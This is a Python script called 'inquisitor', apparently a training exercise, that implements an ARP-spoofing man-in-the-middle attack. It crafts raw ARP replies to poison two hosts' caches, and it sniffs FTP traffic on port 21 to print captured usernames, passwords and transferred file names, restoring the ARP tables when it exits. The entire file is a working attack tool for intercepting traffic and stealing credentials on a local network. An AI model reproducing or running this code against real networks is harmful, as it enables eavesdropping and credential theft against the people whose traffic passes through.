#! /usr/bin/python3

import argparse
import binascii
import socket
import struct
import time
import threading
from getmac import get_mac_address as gma
from scapy.all import sniff, Raw


def parser():
    parser = argparse.ArgumentParser(
        prog='inquisitor',
        description='ARP poisoning'
    )
    parser.add_argument(
        'SRC_IP',
        type=str,
        help="IP from source host"
    )
    parser.add_argument(
        'SRC_MAC',
        type=str,
        help="MAC from source host"
    )
    parser.add_argument(
        'TARGET_IP',
        type=str,
        help="IP from target host"
    )
    parser.add_argument(
        'TARGET_MAC',
        type=str,
        help="MAC from target host"
    )
    parser.add_argument(
        '-v', '--verbose',
        default=False, action='store_true',
        help="shows ftp user credentials",
    )
    return parser.parse_args()


"""

                               PKT
|-------------------------------------------------------------------|
| ethhdr | arphdr | sender_mac | sender_ip | target_mac | target_ip |
|-------------------------------------------------------------------|
               ETH_HDR
|------------------------------------|
| h_dest   - destination eth addr    |
| h_source - source ether addr       |
| h_proto  - packet type ID field    |
|------------------------------------|
                ARP_HDR
|-------------------------------------|
| ar_hrd - format of mac address      |
| ar_pro - format of protocol address |
| ar_hln - format of mac address      |
| ar_pln - format of mac address      |
| ar_op  - format of mac address      |
|-------------------------------------|
| ar_sha[6]  - sender hardware address|
| ar_sip[4]  - sender IP address      |
| ar_tha[6]  - target hardware address|
| ar_tip[4]  - target IP address      |
|-------------------------------------|


"""


"""
    struct.unpack()

    !    = Network format
    H    = unsigned short
    B    = unsigned char
    [n]s = char[n]

    https://docs.python.org/3/library/struct.html
"""


# https://docs.huihoo.com/doxygen/linux/kernel/3.7/uapi_2linux_2if__ether_8h.html

ETH_ALEN        = 6 # Octets in one ethernet addr

# These are the defined Ethernet Protocol ID's.
ETH_P_IP        = 0x0800 # Internet Protocol packets
ETH_P_ARP       = 0x0806 # Address Resolution packet

# ARP protocol HARDWARE identifiers
ARPHRD_ETHER    = 1 # Ethernet 10Mbps

# ARP protocol opcodes.
ARPOP_REPLY     = 2


def parse_ip(ip_str):
    try:
        ip_network = socket.inet_aton(ip_str)
        return ip_str, ip_network
    except Exception as e:
        print(f"Invalid IP: {ip_str}")
        exit(1)


args = parser()

IP_SRC_STR, IP_SRC_BYTE = parse_ip(args.SRC_IP)
IP_TARGET_STR, IP_TARGET_BYTE = parse_ip(args.TARGET_IP)
MAC_SRC = args.SRC_MAC
MAC_TARGET = args.TARGET_MAC
MAC_ATTACKER = gma()
VERBOSE_MODE = args.verbose


def create_eth_header(mac_target, mac_infected):
    h_dest = binascii.unhexlify(mac_target.replace(':', ''))
    h_source = binascii.unhexlify(mac_infected.replace(':', ''))
    h_proto = ETH_P_ARP
    eth_header = struct.pack(
        '!6s6sH',
        h_dest, h_source, h_proto
    )
    return eth_header

def create_arp_packet(ip_src, ip_target, mac_target, mac_infected):
    # ARP HEADER
    ar_hrd = ARPHRD_ETHER
    ar_pro = ETH_P_IP
    ar_hln = ETH_ALEN
    ar_pln = 4
    ar_op  = ARPOP_REPLY

    # ARP DATA
    ar_sha = binascii.unhexlify(mac_infected.replace(':', ''))
    ar_sip = socket.inet_aton(ip_src)
    ar_tha = binascii.unhexlify(mac_target.replace(':', ''))
    ar_tip = socket.inet_aton(ip_target)

    arp_packet = struct.pack(
        '!HHBBH6s4s6s4s',
        ar_hrd, ar_pro, ar_hln, ar_pln, ar_op,
        ar_sha, ar_sip,
        ar_tha, ar_tip
    )
    return arp_packet

def create_sendto_socket():
    try:
        return socket.socket(
            socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP)
        )
    except Exception as e:
        print(f"Error: {e}")


def send_packet(ip_src, ip_target, mac_target, mac_infected):
    eth_header = create_eth_header(mac_target, mac_infected)
    arp_packet = create_arp_packet(ip_src, ip_target, mac_target, mac_infected)
    full_arp_packet = eth_header + arp_packet
    sendto_sock = create_sendto_socket()
    sendto_sock.sendto(
        full_arp_packet,
        ("eth0", 0, 0, 0, b'')
    )
    sendto_sock.close()

def poison_target(ip_src, ip_target, mac_target, infected_mac):
    send_packet(ip_src, ip_target, mac_target, infected_mac)


def restore_arp_tables():
    print(f"Restoring tables...")
    for i in range(0, 10):
        poison_target(IP_SRC_STR, IP_TARGET_STR, MAC_TARGET, MAC_SRC)
        poison_target(IP_TARGET_STR, IP_SRC_STR, MAC_SRC, MAC_TARGET)
        time.sleep(1)
    print(f"ARP tables restored...")


SESSION = {
    'USER'  : None,
    'PASS'  : None
}

def handle_loggin(payload):
    global SESSION

    if payload.startswith("USER "):
        SESSION['USER'] = payload.split(" ", 1)[1].strip()
    if payload.startswith("PASS "):
        SESSION['PASS'] = payload.split(" ", 1)[1].strip()
    if 'Login successful.' in payload and SESSION['USER'] != None and SESSION['PASS'] != None:
        print(f"USER: [{SESSION['USER']}] with PASS: [{SESSION['PASS']}] connected correctly")
        SESSION['USER'] = None
        SESSION['PASS'] = None
    if 'Login incorrect.' in payload and SESSION['USER'] != None and SESSION['PASS'] != None:
        print(f"USER: [{SESSION['USER']}] with PASS: [{SESSION['PASS']}] coudn't connect")
        SESSION['USER'] = None
        SESSION['PASS'] = None


FTP_INFO = {
    'FILENAME'  : None,
    'METHOD'    : None
}

def handle_ftp(payload):
    global FTP_INFO

    if payload.startswith("STOR ") or payload.startswith("RETR "):
        FTP_INFO['FILENAME'] = payload.split(" ", 1)[1].strip()
        FTP_INFO['METHOD'] = payload.split(" ", 1)[0].strip()
    if 'Transfer complete.' in payload and FTP_INFO['FILENAME'] != None and FTP_INFO['METHOD'] != None:
        if FTP_INFO['METHOD'] == 'STOR':
            print(f"File: [{FTP_INFO['FILENAME']}] sended")
        if FTP_INFO['METHOD'] == 'RETR':
            print(f"File: [{FTP_INFO['FILENAME']}] received")
        FTP_INFO['FILENAME'] = None
        FTP_INFO['METHOD'] = None

def parse_ftp_packet(packet):
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        if VERBOSE_MODE:
            handle_loggin(payload)
        handle_ftp(payload)


def start_sniffer():
    print(f"Starting FTP sniffer...")
    sniff(filter="tcp port 21", prn=parse_ftp_packet, store=0)


if __name__ == "__main__":
    sniffer_thread = threading.Thread(target=start_sniffer, daemon=True)
    try:
        sniffer_thread.start()

        print(f"Starting ARP poisoning...")
        while True:
            poison_target(IP_SRC_STR, IP_TARGET_STR, MAC_TARGET, MAC_ATTACKER)
            poison_target(IP_TARGET_STR, IP_SRC_STR, MAC_SRC, MAC_ATTACKER)
            time.sleep(1)
    except KeyboardInterrupt:
        restore_arp_tables()
